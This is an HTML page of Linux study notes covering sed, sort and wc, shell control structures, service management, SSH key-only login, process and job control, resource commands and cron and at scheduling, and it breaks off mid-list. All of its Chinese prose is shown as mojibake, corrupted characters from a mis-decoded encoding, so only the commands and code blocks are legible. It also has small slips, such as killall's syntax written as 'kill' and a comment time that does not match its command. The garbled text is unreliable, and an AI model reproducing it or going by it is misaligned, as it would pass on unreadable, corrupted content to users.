<p>i :æ’å…¥,å†å½“å‰è¡Œå‰æ’å…¥ä¸€è¡Œæˆ–è€…å¤šè¡Œ,æ’å…¥å¤šè¡Œæ—¶ç»“å°¾è¦åŠ \è¡¨ç¤ºæ•°æ®æœªå®Œç»“,2iåœ¨ç¬¬äºŒè¡Œä¹‹å‰æ’å…¥</p>
<p>d :åˆ é™¤æŒ‡å®šè¡Œ,2,4dçš„æ„æ€ä¸ºåˆ é™¤2-4è¡Œ</p>
<p>p:æ‰“å°è¾“å‡ºæŒ‡å®šè¡Œ,2pç¬¬äºŒè¡Œ</p>
<p>s:å­—ç¬¦æ›¿æ¢,ç”¨ä¸€ä¸ªå­—ç¬¦æ›¿æ¢å¦ä¸€ä¸ªå­—ç¬¦ä¸²    <code>è¡ŒèŒƒå›´s/æ—§å­—ç¬¦ä¸²/æ–°å­—ç¬¦ä¸²/g</code></p>
<h3 id="å­—ç¬¦å¤„ç†å‘½ä»¤"><a href="#å­—ç¬¦å¤„ç†å‘½ä»¤" class="headerlink" title="å­—ç¬¦å¤„ç†å‘½ä»¤"></a>å­—ç¬¦å¤„ç†å‘½ä»¤</h3><h4 id="æ’åºå‘½ä»¤"><a href="#æ’åºå‘½ä»¤" class="headerlink" title="æ’åºå‘½ä»¤"></a>æ’åºå‘½ä»¤</h4><p><code>sort [option] æ–‡ä»¶å</code></p>
<p>é»˜è®¤æŒ‰ç…§å­—æ¯é¡ºåºæ’åº</p>
<p>-f :å¿½ç•¥å¤§å°å†™</p>
<p>-n : ä»¥æ•°å€¼å‹è¿›è¡Œæ’åº</p>
<p>-r :åå‘æ’åº</p>
<p>-t :æŒ‡å®šåˆ†å‰²ç¬¦,é»˜è®¤æ˜¯åˆ¶è¡¨ç¬¦</p>
<p>-k n[,m] : æŒ‰ç…§æŒ‡å®šçš„å­—æ®µèŒƒå›´æ’åº,ä»nä¸ªå­—æ®µå¼€å§‹,mä¸ªå­—æ®µç»“æŸ,é»˜è®¤åˆ°è¡Œå°¾</p>
<h4 id="ç»Ÿè®¡å‘½ä»¤"><a href="#ç»Ÿè®¡å‘½ä»¤" class="headerlink" title="ç»Ÿè®¡å‘½ä»¤"></a>ç»Ÿè®¡å‘½ä»¤</h4><p><code>wc [option] æ–‡ä»¶</code></p>
<p>-l åªç»Ÿè®¡è¡Œæ•°</p>
<p>-w åªç»Ÿè®¡å•è¯æ•°</p>
<p>-m åªç»Ÿè®¡å­—ç¬¦æ•°</p>
<h3 id="æµç¨‹æ§åˆ¶è¯­å¥"><a href="#æµç¨‹æ§åˆ¶è¯­å¥" class="headerlink" title="æµç¨‹æ§åˆ¶è¯­å¥"></a>æµç¨‹æ§åˆ¶è¯­å¥</h3><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if test-commands #test-commandså°±æ˜¯æ¡ä»¶åˆ¤æ–­å¼ç”¨[]æ‹¬èµ·æ¥çš„æµ‹è¯•è¯­å¥</span><br><span class="line">then </span><br><span class="line">	commands</span><br><span class="line">fi </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">å¤šåˆ†æ”¯çš„<span class="keyword">if</span>è¯­å¥</span></span><br><span class="line">if test-commands-1</span><br><span class="line">	then </span><br><span class="line">	commands-1</span><br><span class="line">elif test-commands-2</span><br><span class="line">	then</span><br><span class="line">	commands-2</span><br><span class="line">	...</span><br><span class="line">else</span><br><span class="line">	commands</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œifè¯­å¥ä¸­çš„æ¡ä»¶åˆ¤æ–­ä¸æ˜¯ä»¥1ä¸ºçœŸæ‰§è¡Œçš„ï¼Œè€Œæ˜¯åˆ¤æ–­å—ç›¸å½“äºä¸€ä¸ªå‡½æ•°ï¼Œè¯¥å‡½æ•°çš„è¿”å›å€¼å¦‚æœä¸º0ï¼Œåˆ™ifæ¡ä»¶æˆç«‹ï¼Œå¦‚æœä¸ä¸º0ï¼Œåˆ™æ¡ä»¶ä¸æˆç«‹ï¼Œä¸ºå‡ã€‚åŒæ ·çš„åˆ¤æ–­è¯­å¥å—ä¸ä»…åœ¨æ­¤æˆç«‹ï¼Œwhileå’Œuntilä¸­åŒæ ·é€‚ç”¨ã€‚</p>
<h4 id="case"><a href="#case" class="headerlink" title="case"></a>case</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">case word in </span><br><span class="line">	pattern-1)</span><br><span class="line">		commands-1</span><br><span class="line">		;;</span><br><span class="line">	pattern-2)</span><br><span class="line">		commands-2</span><br><span class="line">		;;</span><br><span class="line">	...</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

<p>;;ç¬¦å·ç›¸å½“äºbreakè¯­å¥</p>
<h4 id="while-amp-until"><a href="#while-amp-until" class="headerlink" title="while &amp; until"></a>while &amp; until</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">while test-commands</span><br><span class="line">do</span><br><span class="line">	commands</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">until test-commands</span><br><span class="line">do</span><br><span class="line">	commands</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>whileå’Œuntilçš„åŒºåˆ«åœ¨äºï¼Œwhileæ˜¯è¯­å¥å—æˆçœŸï¼ˆè¿”å›å€¼ä¸º0ï¼‰æ—¶åšdoï¼Œè€Œuntilæ—¶å½“è¯­å¥å—ä¸ºå‡ï¼ˆè¿”å›å€¼ä¸º1ï¼‰æ—¶åšdo</p>
<h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for variable in list #è¿™ä¸ªlistå¯ä»¥æ˜¯å•ç‹¬çš„æ–‡ä»¶æ¯”å¦‚1.txt 2.txtä¹Ÿå¯ä»¥æ˜¯cat test.txtç„¶åæ–‡ä»¶ä¸­æœ‰ç©ºæ ¼æˆ–è€…tabåˆ†å‰²ç›¸å½“äºpyä¸­çš„åˆ—è¡¨  </span><br><span class="line">do </span><br><span class="line">	commands</span><br><span class="line">done</span><br><span class="line"><span class="meta">#</span><span class="bash"> æˆ–è€…å¸¸è§„ç¼–ç¨‹è¯­è¨€çš„ä¹ æƒ¯</span></span><br><span class="line">for(( i=1;i&lt;=100;i++ ))</span><br></pre></td></tr></table></figure>

<h4 id="function"><a href="#function" class="headerlink" title="function"></a>function</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">function funname()</span><br><span class="line">&#123;</span><br><span class="line">    return int;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h4><p>ä¾‹å¦‚<code>a=(1 2 3 4 5)</code></p>
<h2 id="æœåŠ¡"><a href="#æœåŠ¡" class="headerlink" title="æœåŠ¡"></a>æœåŠ¡</h2><p>æœåŠ¡åˆ†ç±»:</p>
<ol>
<li>rpmåŒ…é»˜è®¤å®‰è£…çš„æœåŠ¡(ç‹¬ç«‹çš„æœåŠ¡,åŸºäºxinetdçš„æœåŠ¡)</li>
<li>æºç åŒ…å®‰è£…çš„æœåŠ¡</li>
</ol>
<p>xinetdåå°ç®¡ç†ä¸€ç³»åˆ—ç‹¬ç«‹çš„æœåŠ¡,ç”¨æˆ·åªèƒ½é€šè¿‡è®¿é—®xinetdçš„æœåŠ¡é—´æ¥è®¿é—®åå°ç®¡ç†çš„æœåŠ¡</p>
<p>è€Œç‹¬ç«‹çš„æœåŠ¡å°±æ˜¯ç›´æ¥å¯ä»¥åœ¨å†…å­˜ä¸­è¢«è®¿é—®åˆ°è€Œä¸éœ€è¦ç»è¿‡xinetd</p>
<p>æŸ¥è¯¢rpmå·²ç»å®‰è£…çš„æœåŠ¡:</p>
<p>chkconfig â€“list  #æŸ¥çœ‹è‡ªå¯åŠ¨æŸ¥çœ‹å‘½ä»¤rpm  # unbuntuä¸‹ä½¿ç”¨sysv-rc-confå·¥å…·</p>
<ul>
<li>ps aux</li>
<li>netstat -tlun</li>
</ul>
<p>æŸ¥çœ‹æºç åŒ…å®‰è£…çš„ä½ç½®:ä¸€èˆ¬æ˜¯/usr/local</p>
<h3 id="rpmåŒ…å®‰è£…çš„æœåŠ¡"><a href="#rpmåŒ…å®‰è£…çš„æœåŠ¡" class="headerlink" title="rpmåŒ…å®‰è£…çš„æœåŠ¡"></a>rpmåŒ…å®‰è£…çš„æœåŠ¡</h3><ul>
<li>rpmåŒ…æœåŠ¡äº§ç”Ÿçš„æ•°æ®:<code>/var/lib/</code></li>
<li>rpmåŒ…æœåŠ¡äº§ç”Ÿçš„æ—¥å¿—:<code>/var/log/</code></li>
</ul>
<h4 id="rpmåŒ…ç‹¬ç«‹æœåŠ¡çš„ç®¡ç†"><a href="#rpmåŒ…ç‹¬ç«‹æœåŠ¡çš„ç®¡ç†" class="headerlink" title="rpmåŒ…ç‹¬ç«‹æœåŠ¡çš„ç®¡ç†"></a>rpmåŒ…ç‹¬ç«‹æœåŠ¡çš„ç®¡ç†</h4><p>å¯åŠ¨è„šæœ¬çš„ä½ç½®:<code>/etc/init.d/</code></p>
<p>åˆå§‹åŒ–é…ç½®æ–‡ä»¶:<code>/etc/sysconfig/</code></p>
<p>å¯åŠ¨å‘½ä»¤:<code>/etc/init.d/æœåŠ¡å start|stop|status|restart</code>  æˆ–è€…<code>service æœåŠ¡å start|stop|status|restart</code></p>
<p>æŸ¥çœ‹æ‰€æœ‰æœåŠ¡å®‰è£…çš„çŠ¶æ€:<code>service --status-all</code></p>
<p>ä¿®æ”¹<em><strong>è‡ªå¯åŠ¨</strong></em>*æ–¹æ³•:</p>
<ul>
<li><strong>ä¿®æ”¹/etc/rc.localæ–‡ä»¶:å¾€æ–‡ä»¶ä¸­åŠ å…¥ æ ‡å‡†çš„ç»å¯¹è·¯å¾„å¯åŠ¨å‘½ä»¤,å°±ä¼šå¼€å¯è‡ªå¯åŠ¨æœåŠ¡</strong>(é€‚ç”¨äºæºç åŒ…å®‰è£…å’ŒrpmåŒ…å®‰è£…çš„æœåŠ¡)<ul>
<li>/etc/rc.local çš„ä½œç”¨æ˜¯åœ¨å¼€æœºä¹‹åç”¨æˆ·è¾“å…¥å¯†ç ä¹‹å‰è¿è¡Œçš„è„šæœ¬</li>
</ul>
</li>
<li>ntsysvå‘½ä»¤å¯åŠ¨ç®¡ç†è‡ªå¯åŠ¨,ç±»ä¼¼setup. (ubuntuä¸­ç”¨sysv-rc-confæ›¿ä»£)</li>
</ul>
<h4 id="rpmåŒ…åŸºäºxinetdæœåŠ¡çš„ç®¡ç†"><a href="#rpmåŒ…åŸºäºxinetdæœåŠ¡çš„ç®¡ç†" class="headerlink" title="rpmåŒ…åŸºäºxinetdæœåŠ¡çš„ç®¡ç†"></a>rpmåŒ…åŸºäºxinetdæœåŠ¡çš„ç®¡ç†</h4><p>å¯åŠ¨è„šæœ¬çš„ä½ç½®:<code>/etc/xinetd.d/</code></p>
<p>xinetdé…ç½®æ–‡ä»¶:<code>/etc/xinetd.conf</code></p>
<p>xinetdæœåŠ¡çš„å¯åŠ¨:</p>
<p>ä¿®æ”¹<code>/etc/xinetd.d/æœåŠ¡å</code>ä¸­çš„disableæ¥å¯åŠ¨æœåŠ¡,ä¿®æ”¹å®Œé…ç½®æ–‡ä»¶åéœ€è¦é‡å¯xinetdçš„æœåŠ¡,service xinetd restart</p>
<ul>
<li>xinetdä¸­å¯åŠ¨å’Œè‡ªå¯åŠ¨æ²¡åŒºåˆ«,æ›´æ”¹äº†é…ç½®æ–‡ä»¶å¯åŠ¨å,è‡ªåŠ¨å¼€æœºå¯åŠ¨.</li>
</ul>
<h3 id="æºç åŒ…å®‰è£…æœåŠ¡"><a href="#æºç åŒ…å®‰è£…æœåŠ¡" class="headerlink" title="æºç åŒ…å®‰è£…æœåŠ¡"></a>æºç åŒ…å®‰è£…æœåŠ¡</h3><ul>
<li>å¯åŠ¨</li>
</ul>
<p>åœ¨æºç åŒ…ä¸­æ‰¾åˆ°å®‰è£…è¯´æ˜æ‰“å¼€,æ‰¾åˆ°å¯åŠ¨çš„ç»å¯¹è·¯å¾„,ç»ˆç«¯è¾“å…¥å›è½¦,å³<code>ç»å¯¹è·¯å¾„ start|stop|status|restart</code></p>
<ul>
<li>è‡ªå¯åŠ¨</li>
</ul>
<p>åœ¨æºç åŒ…ä¸­æ‰¾åˆ°å®‰è£…è¯´æ˜æ‰“å¼€,æ‰¾åˆ°å¯åŠ¨çš„ç»å¯¹è·¯å¾„å°±å¯ä»¥,å†™å…¥/etc/rc.localæ–‡ä»¶ä¸­</p>
<ul>
<li>è®©æºç åŒ…æœåŠ¡å¯ä»¥è¢«æœåŠ¡ç®¡ç†å‘½ä»¤è¯†åˆ«(service æœåŠ¡å)</li>
</ul>
<p>åªéœ€è¦åšä¸€ä¸ªè½¯è¿æ¥</p>
<p><code>ln  -s  å¯åŠ¨å‘½ä»¤ /etc/init.d/è‡ªå®šä¹‰ä¸€ä¸ªæœåŠ¡å</code></p>
<h3 id="ssh-æœåŠ¡"><a href="#ssh-æœåŠ¡" class="headerlink" title="ssh æœåŠ¡"></a>ssh æœåŠ¡</h3><ul>
<li><p>å¼€å¯å¯†é’¥å…³é—­å¯†ç </p>
<ol>
<li>ç”Ÿæˆå¯†é’¥å¯¹</li>
</ol>
<p><code>ssh-keygen -t rsa</code> ç”Ÿæˆpublic key &amp; private key</p>
<p>/root/.ssh/id_rsaä¸ºprivate key</p>
<p>/root/.ssh/id_rsa.pubä¸ºpublic key</p>
<p>å¤åˆ¶private keyåˆ°æœ¬åœ°è¿›è¡Œï¼Œç»™äºˆæƒé™</p>
<ol start="2">
<li><p>ä¿®æ”¹sshé…ç½®</p>
<p>/etc/ssh/sshd_config</p>
<p>ä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PasswordAuthentication no</span><br><span class="line">PubkeyAuthentication yes ##ä½¿ç”¨keyç™»å½•</span><br><span class="line">AuthorizedKeysFile .ssh/authorized_keys ##public keyçš„åå­—</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
<p>â€‹    <strong>è®°å¾—é‡å¯sshdæœåŠ¡</strong></p>
<p><code>service sshd restart</code></p>
<ol start="3">
<li><p>å°è¯•ç™»å½•</p>
<p>å°è¯•ç”¨å¯†é’¥ç™»å½•</p>
</li>
</ol>
<h2 id="linuxç³»ç»Ÿç®¡ç†"><a href="#linuxç³»ç»Ÿç®¡ç†" class="headerlink" title="linuxç³»ç»Ÿç®¡ç†"></a>linuxç³»ç»Ÿç®¡ç†</h2><h3 id="è¿›ç¨‹ç®¡ç†"><a href="#è¿›ç¨‹ç®¡ç†" class="headerlink" title="è¿›ç¨‹ç®¡ç†"></a>è¿›ç¨‹ç®¡ç†</h3><h4 id="æŸ¥çœ‹ç³»ç»Ÿå½“ä¸­æ‰€æœ‰è¿›ç¨‹ps"><a href="#æŸ¥çœ‹ç³»ç»Ÿå½“ä¸­æ‰€æœ‰è¿›ç¨‹ps" class="headerlink" title="æŸ¥çœ‹ç³»ç»Ÿå½“ä¸­æ‰€æœ‰è¿›ç¨‹ps"></a>æŸ¥çœ‹ç³»ç»Ÿå½“ä¸­æ‰€æœ‰è¿›ç¨‹ps</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps aux   #unixæ ‡å‡†,bsdæ“ä½œæ ¼å¼</span><br><span class="line">ps -le  #linuxæ ‡å‡†</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºä¸ƒä¸ªå­—æ®µçš„è§£é‡Š:<br>USER     PID       %CPU      %MEM       VSZ     RSS      TTY          STAT      START      TIME        COMMAND</p>
<pre><code>VSZ:å ç”¨è™šæ‹Ÿå†…å­˜å¤§å°,å•ä½kB

RSS:å ç”¨å®é™…ç‰©ç†å†…å­˜å¤§å°,å•ä½KB

TTY:ç»ˆç«¯å·,tty1-7ä»£è¡¨æœ¬åœ°æ§åˆ¶ç»ˆç«¯,1~6æ˜¯æœ¬åœ°å­—ç¬¦ç»ˆç«¯,tty7æ˜¯å›¾å½¢ç»ˆç«¯,pts/0-255ä»£è¡¨è™šæ‹Ÿç»ˆç«¯(è¿œç¨‹ç™»å½•)

STAT:status,Rè¿è¡Œ,Sç¡çœ ,Tåœæ­¢,såŒ…å«å­è¿›ç¨‹,+ä½äºåå°

START:å¯åŠ¨æ—¶é—´

TIME:cpuè¿ç®—æ—¶é—´

COMMAND:äº§ç”Ÿè¿›ç¨‹çš„å‘½ä»¤ 
</code></pre>
<h4 id="æŸ¥çœ‹ç³»ç»ŸçŠ¶æ€"><a href="#æŸ¥çœ‹ç³»ç»ŸçŠ¶æ€" class="headerlink" title="æŸ¥çœ‹ç³»ç»ŸçŠ¶æ€"></a>æŸ¥çœ‹ç³»ç»ŸçŠ¶æ€</h4><p><code>top [option]</code></p>
<pre><code>-d ç§’æ•°,é»˜è®¤æ˜¯ä¸‰ç§’æ›´æ–°ä¸€æ¬¡

P    cpuä½¿ç”¨ç‡æ’åº,é»˜è®¤å³ä¸ºæ­¤é¡¹

M    ä»¥å†…å­˜çš„ä½¿ç”¨ç‡æ’åº

N     ä»¥pidæ’åº

q   é€€å‡ºtop
</code></pre>
<h4 id="æŸ¥çœ‹è¿›ç¨‹æ ‘"><a href="#æŸ¥çœ‹è¿›ç¨‹æ ‘" class="headerlink" title="æŸ¥çœ‹è¿›ç¨‹æ ‘"></a>æŸ¥çœ‹è¿›ç¨‹æ ‘</h4><p><code>pstree [option]</code></p>
<p>-p :æ˜¾ç¤ºè¿›ç¨‹pid,è¯¦ç»†æ˜¾ç¤º</p>
<p>-u:æ˜¾ç¤ºè¿›ç¨‹çš„æ‰€å±ç”¨æˆ·</p>
<h4 id="ç»ˆæ­¢è¿›ç¨‹"><a href="#ç»ˆæ­¢è¿›ç¨‹" class="headerlink" title="ç»ˆæ­¢è¿›ç¨‹"></a>ç»ˆæ­¢è¿›ç¨‹</h4><ol>
<li><p>killå‘½ä»¤(æ ¹æ®pidç»ˆæ­¢è¿›ç¨‹)</p>
<p><code>kill [signal] è¿›ç¨‹pid</code>#-læ˜¾ç¤ºæ‰€æœ‰æ•°å­—é€‰é¡¹</p>
<p>-1   é‡å¯</p>
<p>-9   å¼ºåˆ¶ç»ˆæ­¢</p>
<p>-15  é»˜è®¤ä¿¡å·,å³æ­£å¸¸ç»ˆæ­¢è¿›ç¨‹</p>
</li>
<li><p>killallå‘½ä»¤(æ ¹æ®è¿›ç¨‹åç»ˆæ­¢è¿›ç¨‹)</p>
<p><code>kill [option] [signal] è¿›ç¨‹å</code></p>
<p>option:</p>
<p>-i   äº¤äº’å¼,ä¼šè¯¢é—®æ˜¯å¦è¦æ€æ­»æŸä¸ªè¿›ç¨‹</p>
<p>-I   å¿½ç•¥è¿›ç¨‹åå¤§å°å†™</p>
<p>signalå’Œkillå‘½ä»¤ä¸€æ ·</p>
</li>
<li><p>pkillå‘½ä»¤</p>
<p>æŒ‰ç…§è¿›ç¨‹åç»ˆæ­¢è¿›ç¨‹,å’Œkillallç›¸åŒ</p>
<p><code>pkill [option] [signal] è¿›ç¨‹å</code></p>
<p>å¤šäº†ä¸€ä¸ªé€‰é¡¹<code>-t   ç»ˆç«¯å·</code>æŒ‰ç…§ç»ˆç«¯å·(ç»ˆç«¯å·å°±æ˜¯TTYçš„å€¼)è¸¢å‡ºç”¨æˆ·</p>
<ul>
<li><p>ä½¿ç”¨wæŸ¥è¯¢æœ¬æœºå·²ç»ç™»å½•çš„ç”¨æˆ·</p>
</li>
<li><p>è¸¢å‡ºç”¨æˆ·<code>pkill -t -9 ç»ˆç«¯å·</code></p>
</li>
</ul>
</li>
</ol>
<h3 id="å·¥ä½œç®¡ç†"><a href="#å·¥ä½œç®¡ç†" class="headerlink" title="å·¥ä½œç®¡ç†"></a>å·¥ä½œç®¡ç†</h3><h4 id="ä»»åŠ¡åå°"><a href="#ä»»åŠ¡åå°" class="headerlink" title="ä»»åŠ¡åå°"></a>ä»»åŠ¡åå°</h4><ol>
<li>åœ¨ä¸€æ¡å‘½ä»¤çš„ç»“å°¾åŠ å…¥ä¸€ä¸ªâ€&amp;â€,ç³»ç»Ÿä¼šåœ¨åå°æ‰§è¡Œä»»åŠ¡ç›´åˆ°å®Œæˆä»»åŠ¡</li>
<li>åœ¨ä»»åŠ¡æ‰§è¡Œçš„è¿‡ç¨‹ä¸­,ctrl+Zè¡¨ç¤ºæš‚åœä»»åŠ¡(ctrl+Cè¡¨ç¤ºç»“æŸ)</li>
</ol>
<h4 id="æŸ¥çœ‹åå°åœ¨æ‰§è¡Œçš„ä»»åŠ¡"><a href="#æŸ¥çœ‹åå°åœ¨æ‰§è¡Œçš„ä»»åŠ¡" class="headerlink" title="æŸ¥çœ‹åå°åœ¨æ‰§è¡Œçš„ä»»åŠ¡"></a>æŸ¥çœ‹åå°åœ¨æ‰§è¡Œçš„ä»»åŠ¡</h4><p><code>jobs [option] </code></p>
<p>-l  æ˜¾ç¤ºpid</p>
<p>â€œ+â€è¡¨ç¤ºæœ€åä¸€ä¸ªæ”¾å…¥åå°çš„å·¥ä½œ,é»˜è®¤æ¢å¤çš„å·¥ä½œ</p>
<p>â€œ-â€œè¡¨ç¤ºå€’æ•°ç¬¬äºŒä¸ªæ”¾å…¥åå°çš„å·¥ä½œ</p>
<h4 id="æ¢å¤åå°æš‚åœçš„ä»»åŠ¡åˆ°å‰å°"><a href="#æ¢å¤åå°æš‚åœçš„ä»»åŠ¡åˆ°å‰å°" class="headerlink" title="æ¢å¤åå°æš‚åœçš„ä»»åŠ¡åˆ°å‰å°"></a>æ¢å¤åå°æš‚åœçš„ä»»åŠ¡åˆ°å‰å°</h4><p><code>fg %å·¥ä½œå·</code></p>
<p>å·¥ä½œå·æ˜¯jobsçš„ç¬¬ä¸€ä¸ªå­—æ®µçš„æ•°å­—</p>
<p><strong>%å·å¯ä»¥çœç•¥</strong>,æ¢å¤çš„å°±æ˜¯jobsä¸­æ˜¾ç¤º+å·çš„ä»»åŠ¡.</p>
<p>kill %å·¥ä½œå·</p>
<h4 id="æŠŠåå°æš‚åœçš„ä»»åŠ¡ç»§ç»­åå°æ‰§è¡Œ"><a href="#æŠŠåå°æš‚åœçš„ä»»åŠ¡ç»§ç»­åå°æ‰§è¡Œ" class="headerlink" title="æŠŠåå°æš‚åœçš„ä»»åŠ¡ç»§ç»­åå°æ‰§è¡Œ"></a>æŠŠåå°æš‚åœçš„ä»»åŠ¡ç»§ç»­åå°æ‰§è¡Œ</h4><p><code>bg %å·¥ä½œå·</code></p>
<h4 id="ç³»ç»Ÿèµ„æºæŸ¥çœ‹"><a href="#ç³»ç»Ÿèµ„æºæŸ¥çœ‹" class="headerlink" title="ç³»ç»Ÿèµ„æºæŸ¥çœ‹"></a>ç³»ç»Ÿèµ„æºæŸ¥çœ‹</h4><ol>
<li><p>vmstatç›‘æ§ç³»ç»Ÿèµ„æº</p>
<p><code>vmstat [åˆ·æ–°å»¶æ—¶][åˆ·æ–°æ¬¡æ•°] </code></p>
</li>
<li><p>dmesgå¼€æœºæ—¶å†…æ ¸æ£€æµ‹ä¿¡æ¯,cpuç­‰ç¡¬ä»¶ä¿¡æ¯</p>
</li>
<li><p>free [-b | -k | -m | -g] å†…å­˜ä½¿ç”¨çŠ¶æ€</p>
<p>-b   ä»¥å­—èŠ‚ä¸ºå•ä½æ˜¾ç¤º</p>
<p>-k  ä»¥KBä¸ºå•ä½æ˜¾ç¤º</p>
<p>-m  ä»¥MBä¸ºå•ä½æ˜¾ç¤º</p>
<p>-g ä»¥GBä¸ºå•ä½æ˜¾ç¤º</p>
</li>
<li><p>cat /proc/cpuinfo   æ˜¾ç¤ºcpuä¿¡æ¯</p>
</li>
<li><p>uptime    æ˜¾ç¤ºtopçš„ç¬¬ä¸€è¡Œ</p>
</li>
<li><p>uname [option]</p>
<p>-a   æŸ¥çœ‹ç³»ç»Ÿçš„æ‰€æœ‰ä¿¡æ¯</p>
<p>-r    æŸ¥çœ‹å†…æ ¸çš„ç‰ˆæœ¬</p>
<p>-s    æŸ¥çœ‹å†…æ ¸çš„åç§°</p>
<p>-m  æŸ¥çœ‹æ“ä½œç³»ç»Ÿä½æ•°</p>
</li>
<li><p>linuxå‘è¡Œç‰ˆæœ¬ lsb_release -a</p>
</li>
<li><p>lsof  [option]åˆ—å‡ºè¿›ç¨‹æ‰“å¼€æˆ–ä½¿ç”¨çš„æ–‡ä»¶ä¿¡æ¯</p>
<p>-c  å­—ç¬¦ä¸² :åªåˆ—å‡ºå­—ç¬¦ä¸²å¼€å¤´çš„è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶</p>
<p>-u ç”¨æˆ·å    : åªåˆ—å‡ºæŸä¸ªç”¨æˆ·çš„è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶</p>
<p>-p pid :åˆ—å‡ºæŸä¸ªpidè¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶</p>
<p>lsof -i :[ï½ï½ï½’ï½”]æŸ¥çœ‹æŸä¸ªportçš„ç«¯å£å·</p>
</li>
</ol>
<h4 id="å®šæ—¶ä»»åŠ¡crond"><a href="#å®šæ—¶ä»»åŠ¡crond" class="headerlink" title="å®šæ—¶ä»»åŠ¡crond"></a>å®šæ—¶ä»»åŠ¡crond</h4><ul>
<li><p>ä¸€æ¬¡æ€§è®¡åˆ’ä»»åŠ¡atï¼ˆatomï¼‰</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">åœ¨23:20é‡å¯ç½‘ç«™æœåŠ¡</span></span><br><span class="line">at 23:30 # è¿›å…¥äº¤äº’å¼æ¨¡å¼</span><br><span class="line"><span class="meta">at&gt;</span><span class="bash"> systemctl restart httpd</span></span><br><span class="line"><span class="meta">at&gt;</span><span class="bash"> æŒ‰ä¸‹ctrl+d</span></span><br><span class="line">at -l #åˆ—å‡ºæ‰€æœ‰çš„ä¸€æ¬¡æ€§å®šæ—¶æ€§ä»»åŠ¡</span><br><span class="line">atrm [æ•°å­—] # æ ¹æ®ä¸Šä¸€æ¡å‘½ä»¤åˆ—å‡ºçš„åºå·é€‰æ‹©åˆ é™¤</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">ä¸é‡‡ç”¨äº¤äº’å¼ç›´æ¥å†™è®¡åˆ’ä»»åŠ¡</span></span><br><span class="line">echo &quot;systemctl restart httpd&quot; | at 23:30       </span><br></pre></td></tr></table></figure></li>
<li><p>é•¿æœŸæ€§è®¡åˆ’ä»»åŠ¡</p>
<p><code>crontab [option]</code></p>
<p>-e  ç¼–è¾‘crontabå®šæ—¶ä»»åŠ¡</p>
<p>-l   æŸ¥è¯¢ç°æœ‰çš„crontabä»»åŠ¡</p>
<p>-r   åˆ é™¤å½“å‰ç”¨æˆ·æ‰€æœ‰çš„crontabä»»åŠ¡</p>
<p><strong>å¦‚æœæ˜¯å½“å‰ç”¨æˆ·ç›´æ¥crontab -eè¿›å…¥ç¼–è¾‘çŠ¶æ€</strong></p>
<p>æ ¼å¼ ï¼š  <code>åˆ†ã€æ—¶ã€æ—¥ã€æœˆã€æ˜ŸæœŸ å‘½ä»¤</code></p>
<p>åˆ†0-59,ä¸€ä¸ªå°æ—¶çš„ç¬¬å‡ åˆ†é’Ÿ</p>
<p>æ—¶0-23</p>
<p>æ—¥1-31</p>
<p>æœˆ1-12</p>
<p>æ˜ŸæœŸ 0,7éƒ½ä»£è¡¨ç¤¼æ‹œæ—¥</p>
<p>*ä»£è¡¨ä»»ä½•æ—¶é—´</p>
<p>,è¡¨ç¤ºä¸è¿ç»­çš„æ—¶é—´</p>
<p>-è¡¨ç¤ºè¿ç»­çš„æ—¶é—´èŒƒå›´</p>
<p>*/n è¡¨ç¤ºæ¯éš”nåˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">å½“å‰ç”¨æˆ·ä¸‹æŒ‡å®šå®šæ—¶ä»»åŠ¡</span></span><br><span class="line">crontab -e#å›è½¦å°±å¯ä»¥è¿›å…¥ç¼–è¾‘é¡µé¢</span><br><span class="line"><span class="meta">#</span><span class="bash">usage:</span></span><br><span class="line">crontab [ -u user ] file</span><br><span class="line">crontab [ -u user ] &#123; -l | -r | -e &#125;</span><br><span class="line"><span class="meta">#</span><span class="bash">example,ç›¸å½“äºè¿›å…¥äº†ä¸€ä¸ªcrontabæ–‡ä»¶é‡Œé¢ï¼Œç›´æ¥å†™å‘½ä»¤å°±è¡Œ</span></span><br><span class="line">crontab -r</span><br></pre></td></tr></table></figure>

<p><strong>æ³¨æ„</strong></p>
<ul>
